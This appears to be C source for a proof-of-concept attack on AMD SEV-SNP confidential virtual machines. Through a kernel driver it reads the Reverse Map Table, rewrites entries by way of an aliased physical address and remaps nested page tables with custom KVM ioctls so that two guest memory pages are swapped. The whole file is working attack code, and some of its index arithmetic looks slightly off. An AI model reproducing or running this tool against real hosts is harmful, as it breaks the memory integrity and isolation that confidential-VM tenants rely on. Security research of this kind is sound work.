
#include <limits.h>
#include <stdio.h>
#include <errno.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>


#include "proc_iomem_parser.h"
#include "readalias.h"
#include "helpers.h"
#include "mem_range_repo.h"
#include "kvm_ioctls.h"

#include "rmp.h"

typedef struct {
  mem_range_t* mrs;
  uint64_t* alias_masks;
  //lenght for both mrs and alias_masks
  size_t len;
} alias_data_t;


int write_rmp_by_gpa(uint64_t pa_rmp_start, uint64_t pa_rmp_end, uint64_t target_gpa, alias_data_t  alias_data, uint64_t new_gpa ) {

  //read rmp
  size_t rmp_buf_bytes = pa_rmp_end - pa_rmp_start;
  uint8_t* rmp_buf = malloc(rmp_buf_bytes);
  page_stats_t stats;

  if( open_kmod() ) {
    err_log("failed to open driver\n");
    goto error;
  }
  if( wbinvd_ac() ) {
    err_log("flush failed\n");
    goto error;
  }
  if( memcpy_frompa(rmp_buf,pa_rmp_start, rmp_buf_bytes , &stats, true)) {
    err_log("direct read of rmp at 0x%jx failed\n", pa_rmp_start) ;
    goto error;
  }
  //first 16 KiB are "processor reserved", rmp entries start afterwards
  rmp_entry_t* rmp = (rmp_entry_t*) (rmp_buf + OFFSET_RMP_ENTRIES);
  size_t rmp_len = (rmp_buf_bytes - OFFSET_RMP_ENTRIES) / sizeof(rmp_entry_t);

  //search rmp for entry for target_gpa
  rmp_entry_t* orig_entry = NULL;
  size_t idx_orig_entry = 0;
  for(size_t i = 0; i < rmp_len; i++ ) {
    uint64_t  entry_gpa = rmp[i].info.gpa;
    if( entry_gpa == target_gpa ) {
      orig_entry = rmp+i;
      idx_orig_entry = i;
      break;
    }
  }
  if( !orig_entry ) {
    err_log("did not find entry for target_gpa 0x%jx\n", target_gpa);
    goto error;
  }
  dump_rmp_entry("Original Entry:", *orig_entry, stdout);

  //compute pa for orig_entry and get alias
  uint64_t pa_orig_entry = pa_rmp_start + OFFSET_RMP_ENTRIES + (idx_orig_entry * sizeof(rmp_entry_t));
  uint64_t alias_pa_orig_entry;
  if( get_alias(pa_orig_entry, alias_data.mrs , alias_data.alias_masks , alias_data.len , &alias_pa_orig_entry )) {
    err_log("failed to get alias for 0x%jx\n", pa_orig_entry);
    goto error;
  }

  //manipulate entry and write
  rmp_entry_t manip_entry = *orig_entry;
  manip_entry.info.gpa = new_gpa;
  if(memcpy_topa(alias_pa_orig_entry, (void*)&manip_entry , sizeof(rmp_entry_t) , &stats , true)) {
    err_log("failed to write to rmp entry at pa 0x%jx via alias 0x%jx\n", pa_orig_entry, alias_pa_orig_entry);
    goto error;
  }
  if( wbinvd_ac() ) {
    err_log("flush failed\n");
    goto error;
  }

	int ret =0;
  goto cleanup;
error:
  ret = -1;
cleanup:
  if( rmp_buf ) {
    free(rmp_buf);
  }
  close_kmod();

  return ret;
}



int write_rmp_by_hpa(uint64_t pa_rmp_start, uint64_t pa_rmp_end, uint64_t target_hpa, alias_data_t  alias_data, uint64_t new_gpa ) {

  printf("We assume that data scrambling is disabled!\n");
  //
  // Read + Parse RMP
  //

  size_t rmp_buf_bytes = pa_rmp_end - pa_rmp_start;
  uint8_t* rmp_buf = malloc(rmp_buf_bytes);
  page_stats_t stats;

  if( open_kmod() ) {
    err_log("failed to open driver\n");
    goto error;
  }
  if( wbinvd_ac() ) {
    err_log("flush failed\n");
    goto error;
  }
  if( memcpy_frompa(rmp_buf,pa_rmp_start, rmp_buf_bytes , &stats, true)) {
    err_log("direct read of rmp at 0x%jx failed\n", pa_rmp_start) ;
    goto error;
  }
  //first 16 KiB are "processor reserved", rmp entries start afterwards
  rmp_entry_t* rmp = (rmp_entry_t*) (rmp_buf + OFFSET_RMP_ENTRIES);
  size_t rmp_len = (rmp_buf_bytes - OFFSET_RMP_ENTRIES) / sizeof(rmp_entry_t);

  //
  // Find RMP entry for target_hpa and update the gpa field through the alias
  //


  //find rmp entry for target_hpa
  if( (target_hpa % 4096) != 0) {
    err_log("target_hpa 0x%jx needs to be page aligned\n", target_hpa);
    goto error;
  }
  size_t target_rmp_idx = target_hpa / 4096;
  if( target_rmp_idx >= rmp_len ) {
    err_log("target_hpa 0%jx leads to rmp idx %ju but rmp has only %ju entries\n", target_hpa, target_rmp_idx, rmp_len);
    goto error;
  }
  rmp_entry_t cpy_orig_entry = rmp[target_rmp_idx];
  dump_rmp_entry("Original Entry:", cpy_orig_entry, stdout);
  if( cpy_orig_entry.info.pagesize != 1 ) {
    err_log("orignal entry is for 4KB page. our code currently assumes 2MB pages!\n");
    goto error;
  }

  // printf("target_rmp_idx %ju\n", target_rmp_idx);
  uint64_t aligned_rmp_idx = target_rmp_idx;
  //256 entries per 4KB page
  if( (aligned_rmp_idx % 256) != 0  ) {
    aligned_rmp_idx = aligned_rmp_idx - (256 -(aligned_rmp_idx%256));
  }
  if( (aligned_rmp_idx % 256) != 0 ) {
    err_log("aigned_rmp_idx %% 256 is %ju and not 0. This should never happen!\n", aligned_rmp_idx % 256);
    goto error;
  }
  // printf("aligned_rmp_idx %ju\n", aligned_rmp_idx);

  //compute physical address for orig_entry and get alias
  uint64_t pa_orig_entry = pa_rmp_start + OFFSET_RMP_ENTRIES + (aligned_rmp_idx* sizeof(rmp_entry_t));
  uint64_t alias_pa_orig_entry;
  if( get_alias(pa_orig_entry, alias_data.mrs , alias_data.alias_masks , alias_data.len , &alias_pa_orig_entry )) {
    err_log("failed to get alias for 0x%jx\n", pa_orig_entry);
    goto error;
  }

  // printf("pa of rmp entry: 0x%jx\n", pa_orig_entry);
  // printf("alias pa for rmp entry 0x%jx\n", alias_pa_orig_entry);

  //manipulate entry and write
  rmp_entry_t* manip_entry = rmp+target_rmp_idx;
  manip_entry->info.gpa = new_gpa;
  if( wbinvd_ac() ) {
    err_log("flush failed\n");
    goto error;
  }
  if(memcpy_topa(alias_pa_orig_entry, rmp+aligned_rmp_idx , 4096 , &stats , true)) {
    err_log("failed to write to rmp entry at pa 0x%jx via alias 0x%jx\n", pa_orig_entry, alias_pa_orig_entry);
    goto error;
  }
  if( wbinvd_ac() ) {
    err_log("flush failed\n");
    goto error;
  }

  //read again through original pa to ensure tha manipulation was successful
  //TODO: revert back to writing just 16 MiB. This was just some stupid debugging
  rmp_entry_t* got_manip_entries = malloc(4096);
  if(memcpy_frompa(got_manip_entries, pa_orig_entry , 4096 , &stats , true )) {
    err_log("failed to read from rmp entry at pa 0x%jx\n", pa_orig_entry);
    goto error;
  }
  // printf("idx in subarray %ju\n", target_rmp_idx - aligned_rmp_idx);
  rmp_entry_t* got_manip_entry = got_manip_entries + (target_rmp_idx - aligned_rmp_idx);

  if( !rmp_entries_eq(*got_manip_entry, *manip_entry)){
    err_log("RMP updated through alias went wrong!\n");
    dump_rmp_entry("\tExpected\t", *manip_entry , stderr );
    dump_rmp_entry("\tGot\t\t", *got_manip_entry, stderr);
    goto error;
  }

	int ret =0;
  goto cleanup;
error:
  ret = -1;
cleanup:
  if( rmp_buf ) {
    free(rmp_buf);
  }
  close_kmod();

  return ret;
}

/**
 * @brief Get the 2MB page backing gpa
 * @params gpa
 * @params qemu_pid
 * @params out_hpa : Output params. Filled with 2MB page that backs gpa
 * @returns 0 on success
*/
int gpa_to_2mb_hpa(uint64_t gpa, uint64_t qemu_pid, uint64_t* out_hpa) {
  uint64_t hpa;
  if( ioctl_gpa_to_hpa(gpa, qemu_pid , &hpa )) {
    err_log("gpa to hpa for gpa 0x%jx failed\n", gpa);
    return -1;
  }
  //1 << 21 are 2MB
  const uint64_t offset_mask_2mb = (1 << 21) - 1;
  //if hpa is already 2MB aligned, we are done
  if( (hpa & offset_mask_2mb) == 0) {
    *out_hpa = hpa;
    return 0;
  }
  /*otherwise, check if the "2MB" offset of gpa and hpa match
   *if so, it is safe to assume that hpa is a 2MB page and that
   * gpa is backed by that page. 
  */
  if( (hpa & offset_mask_2mb) == (gpa & offset_mask_2mb )) {
    //align to 2MB page by setting the offset bits to zero
    *out_hpa = hpa & ~offset_mask_2mb;
    return 0;
  }

  //if we are here gpa does not seem to back backed by a 2mb page
  return -1;
}


/**
 * @brief Sweep over \p gpa_start to \p gpa_end in \p step_size and fetch
 * the pt entry at \p target_lvel
*/
int debug_print_spte_range(uint64_t qemu_pid, uint64_t gpa_start, uint64_t gpa_end,
                           uint64_t step_size, pg_level_t target_level) {  
  const uint64_t page_size_bit_mask = 1 << 7;
  printf("Dumping PT entries for 0x%jx to 0x%jx in 0x%jx steps targeting level %d\n", gpa_start, gpa_end, step_size, target_level);
  for(uint64_t gpa = gpa_start; gpa < gpa_end; gpa += step_size) { 
    uint64_t spte_raw, spte_hpa;
    if( ioctl_get_spte(qemu_pid, gpa , target_level, &spte_raw , &spte_hpa )) {
      err_log("ioctl_get_spte for gpa 0x%jx failed\n", gpa);
      return -1;
    }
    printf("gpa 0x%jx : spte_raw 0x%jx, spte_hpa 0x%jx, ps bit set? %d\n",
       gpa, spte_raw, spte_hpa, (spte_raw & page_size_bit_mask) != 0 );
  }
  return 0;
}

int swap_attack_run(uint64_t qemu_pid, uint64_t rmp_start, uint64_t rmp_end, alias_data_t alias_data ,uint64_t gpa1, uint64_t gpa2) {

  //2MB page on host containing gpa1
  uint64_t hpa1_2mb;
  if( gpa_to_2mb_hpa(gpa1, qemu_pid , &hpa1_2mb)) {
    err_log("gpa_to_2mb_hpa for  gpa1 0x%jx failed\n", gpa1);
    return -1;
  }

  //2MB page on host containin gpa2
  uint64_t hpa2_2mb;
  if( gpa_to_2mb_hpa(gpa2, qemu_pid , &hpa2_2mb )) {
    err_log("gpa_to_2mb_hpa for gpa2 0x%jx failed\n", gpa2);
    return -1;
  }

  if( hpa1_2mb == hpa2_2mb ) {
    err_log("The gpa1 0x%jx and gpa2 0x%jx are both backed by the same 2MB page 0x%jx. Cannot do swap\n", gpa1, gpa2, hpa1_2mb);
    return -1;
  }

  printf("gpa1 0x%jx hpa1 0x%jx 4K aligned? %d 2MB aligned? %d\n", gpa1, hpa1_2mb, (hpa1_2mb% 4096) == 0, (hpa1_2mb% (1<<21)) == 0);
  printf("gpa2 0x%jx hpa2 0x%jx 4K aligned? %d 2MB aligned? %d\n", gpa2, hpa2_2mb, (hpa2_2mb% 4096) == 0, (hpa2_2mb% (1<<21)) == 0);
  
  //guest frame numbers for the 2MB page that the gpas belongs to
  const uint64_t TWO_MB_OFFSET_MASK = (1<<21)-1;
  uint64_t gfn1_2mb = (gpa1 & ~TWO_MB_OFFSET_MASK) >> PAGE_SHIFT;
  uint64_t gfn2_2mb = (gpa2 & ~TWO_MB_OFFSET_MASK) >> PAGE_SHIFT;


  uint64_t gpa1_spte_raw, gpa1_spte_hpa;
  if( ioctl_get_spte(qemu_pid, gpa1 , PG_LEVEL_2M, &gpa1_spte_raw , &gpa1_spte_hpa )) {
    err_log("ioctl_get_spte for gpa1 failed\n");
    return -1;
  }
  printf("SPTE for gpa1 is 0x%jx, parsed hpa 0x%jx\n", gpa1_spte_raw, gpa1_spte_hpa);
  
  //Swap entries on rmp level
  printf("Setting gfn in rmp entry for gpa1 to 0x%jx\n", gfn2_2mb);
	if(write_rmp_by_hpa(rmp_start, rmp_end, hpa1_2mb  ,alias_data , gfn2_2mb)) {
		err_log("failed to update rmp for gpa1 0x%jx\n", gpa1);
		return -1;
	}
  printf("Setting gfn entry in rmp for gpa2 to 0x%jx\n", gfn1_2mb);
	if(write_rmp_by_hpa(rmp_start, rmp_end , hpa2_2mb ,alias_data , gfn1_2mb)) {
		err_log("failed to update rmp for gpa2 0x%jx\n", gpa2);
		return -1;
	}

  //Swap entries on NPT level. This triggers a TLB flush. Thus, this must happend afte
  //we adjusted the RMP and also we must adjust the mappings for GPA1 **and** GPA2 in
  //in the same vmexit
  printf("\n\nChanging npt for gpa1\n\n");
  if( ioctl_remap_gfns(qemu_pid, gfn1_2mb, hpa2_2mb >> PAGE_SHIFT, gfn2_2mb, hpa1_2mb >> PAGE_SHIFT )) {
    err_log("ioctl_remap_gfn for gpa1 failed\n");
    return -1;
  }

  // printf("Changing npt for gpa2\n");
  // if( ioctl_remap_gfn(qemu_pid, gpa2 >> PAGE_SHIFT , h2mb_hpa1 >> PAGE_SHIFT )) {
  //   err_log("ioctl_remap_gfn for gpa1 failed\n");
  //   return -1;
  // }

  sleep(1);

  if( ioctl_get_spte(qemu_pid, gpa1 , PG_LEVEL_2M, &gpa1_spte_raw , &gpa1_spte_hpa )) {
    err_log("ioctl_get_spte for gpa1 failed\n");
    return -1;
  }
  printf("SPTE for gpa1 is  0x%jx, parsed hpa 0x%jx\n", gpa1_spte_raw, gpa1_spte_hpa);
  if( ioctl_get_spte(qemu_pid, gpa1& ~TWO_MB_OFFSET_MASK , PG_LEVEL_2M, &gpa1_spte_raw , &gpa1_spte_hpa )) {
    err_log("ioctl_get_spte for gpa1 failed\n");
    return -1;
  }
  printf("SPTE for gpa with 2mb align is 0x%jx, parsed hpa 0x%jx\n", gpa1_spte_raw, gpa1_spte_hpa);


  //the npt manipulation code in the kernel should already request a tlb flush
  // if(ioctl_tlb_flush(qemu_pid)) {
  //   err_log("tlb flush failed\n");
  //   return -1;
  // }
	return 0;
}

int main(int argc, char** argv) {
  if( argc != 7) {
    printf("Usage: read_rmp <pa of rmp start> <pa of rmp end> <path to alias file> <qemu pid> <gpa1> <gpa2>\n");
    return -1;
  }
  uint64_t rmp_start,rmp_end;
  if(do_stroul(argv[1], 0, &rmp_start)) {
    printf("Failed to parse '%s' as number\n", argv[1]);
    return -1;
  }
  if(do_stroul(argv[2], 0 , &rmp_end )) {
    printf("Failed to convert '%s' to number\n", argv[2]);
    return -1;
  }
	//msr gives inclusive end, we want exclusive
	rmp_end += 1;

  alias_data_t alias_data;
  if(parse_csv(argv[3], &alias_data.mrs  , &alias_data.alias_masks , &alias_data.len )) {
    err_log("failed to parse alias file at %s\n", argv[3]);
    return -1;
  }

  uint64_t qemu_pid;
  if(do_stroul(argv[4], 0 , &qemu_pid)) {
    printf("Failed to convert '%s' to number\n", argv[4]);
    return -1;
  }

	uint64_t gpa1;
  if(do_stroul(argv[5], 0 , &gpa1)) {
    printf("Failed to convert '%s' to number\n", argv[5]);
    return -1;
  }

	uint64_t gpa2;
  if(do_stroul(argv[6], 0 , &gpa2)) {
    printf("Failed to convert '%s' to number\n", argv[6]);
    return -1;
  }

  return swap_attack_run(qemu_pid, rmp_start, rmp_end, alias_data, gpa1, gpa2);  
}
